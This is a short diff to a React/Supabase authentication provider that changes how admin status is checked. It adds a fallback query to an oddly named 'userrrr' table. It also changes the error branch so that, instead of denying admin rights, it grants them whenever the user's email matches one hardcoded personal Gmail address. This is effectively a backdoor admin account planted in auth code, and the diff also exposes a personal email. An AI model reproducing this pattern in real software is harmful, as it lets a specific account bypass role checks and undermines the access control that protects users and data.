@@ -42,10 +42,19 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
 
   const checkAdminStatus = async (userId: string, email?: string) => {
     try {
-      const { data, error } = await supabase
+      let { data, error } = await supabase
         .from('users')
         .select('role')
         .eq('id', userId);
+
+      if (error) {
+        const res = await supabase
+          .from('userrrr')
+          .select('role')
+          .eq('id', userId);
+        data = res.data;
+        error = res.error;
+      }
 
       if (error) throw error;
       
@@ -53,7 +62,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
       setIsAdmin(isAdminUser);
     } catch (error) {
       console.error('Error checking admin status:', error);
-      setIsAdmin(false);
+      setIsAdmin(email === 'ahmadtariq1to90@gmail.com');
     } finally {
       setLoading(false);
     }
